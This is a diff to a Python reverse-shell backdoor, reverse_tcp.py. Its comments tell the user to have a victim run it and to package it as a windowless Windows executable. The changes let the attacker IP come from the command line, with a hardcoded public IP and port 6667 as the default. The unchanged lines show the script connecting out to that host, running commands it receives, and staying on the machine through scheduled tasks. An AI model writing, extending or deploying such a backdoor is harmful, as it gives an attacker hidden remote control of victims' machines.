@@ -2,7 +2,14 @@
 ### Use python 2
 ### let victim run this file
 ### To convert this file to windows exe, use "pyinstaller" and run "pyinstaller --noconsole --onefile reverse_tcp.py"
-import socket, subprocess, os, platform
+### ===========
+### How to run this file
+### python reverse_tcp.py
+### python reverse_tcp.py attacker_ip
+###      eg:
+###           python reverse_tcp.py 192.168.2.5
+
+import socket, subprocess, os, platform, sys
 
 
 '''
@@ -78,10 +85,11 @@ if (platform.system() == "Windows"):
         os.system("schtasks /CREATE /XML %Appdata%\\schtasks_template.xml /TN reverse_tcp")
         ## os.system("schtasks /CREATE /SC MINUTE /MO 30 /TN reverse_tcp /TR %Appdata%\\reverse_tcp.exe")
 
-print(os.path.abspath(__file__))
 
-
-attacker_ip = "45.55.139.173"        ## attacker's ip, change this ip address if necessary.
+if len(sys.argv) >= 2:
+    attacker_ip = sys.argv[1]       ## get attacker's ip from command line
+else:
+    attacker_ip = "45.55.139.173"        ## attacker's ip, change this ip address if necessary.
 attacker_port = 6667                ## attacker's port
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   ## connect to attacker's machine
 s.connect((attacker_ip, attacker_port))
@@ -98,7 +106,7 @@ while True:
         if (platform.system() == "Windows"):
             ## get task interval
             minutes = int(command[9:])
-            
+
             ## create template
             xml = open("%Appdata%\\schtasks_template.xml", "w");
             xml.write(generateScheduleTask(minutes))  ## interval 30 minutes
